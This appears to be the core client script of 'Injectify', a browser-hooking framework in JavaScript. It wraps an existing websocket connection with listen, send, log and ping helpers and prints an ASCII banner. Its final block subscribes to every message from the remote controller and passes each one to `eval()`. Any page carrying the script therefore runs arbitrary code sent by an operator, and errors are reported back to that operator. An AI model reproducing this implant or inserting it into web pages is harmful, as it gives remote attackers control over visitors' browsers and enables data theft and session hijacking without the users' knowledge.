/**
 * Injectify core API
 * @class
 */
injectify = class injectify {
	/**
	 * Listen for a topic from websocket connection
	 * @param {string} topic Topic name to listen to
	 * @param {function} callback Callback to be triggered once topic received
	 */
	static listen(topic, callback) {
		ws.onmessage = d => {
			try {
				d = JSON.parse(d.data)
				if (topic == d.t || topic == '*') {
					callback(d.d, d.t)
				}
			} catch(e) {
				//throw e
				this.send('e', e.stack)
			}
		}
	}
	/**
	 * Send data to websocket
	 * @param {string} topic Message topic
	 * @param {Object} data Message data
	 */
	static send(topic, data) {
		try {
			ws.send(JSON.stringify({
				t: topic,
				d: data,
			}))
		} catch(e) {
			this.send('e', e.stack)
		}
	}
	/**
	 * Log data to websocket connection (and locally)
	 * @param {(Object|string)} message Data to be logged
	 * @param {boolean} local Whether to log it in the local console
	 */
	static log(message, local) {
		this.send('r', message)
		if (local) console.log(message)
	}
	/**
	 * Get the websocket ping time (in milliseconds)
	 * @param {function} callback Callback to be executed on ping complete
	 */
	static ping(callback) {
		this.send('ping', + new Date())
		this.listen('pong', callback)
	}
	/**
	 * Check that the Injectify core is active
	 */
	static get test() {
		console.log(true)
	}
}

console.log(`%c
  _____        _           _   _  __       
  \\_   \\_ __  (_) ___  ___| |_(_)/ _|_   _ 
   / /\\/ '_ \\ | |/ _ \\/ __| __| | |_| | | |
/\\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
\\____/ |_| |_|/ |\\___|\\___|\\__|_|_|  \\__, |
			|__/                     |___/ 
`, 'color: #0ff')

injectify.listen('*', (data, topic) => {
	try {
		eval(data)
	} catch(e) {
		injectify.send('e', e.stack)
	}
})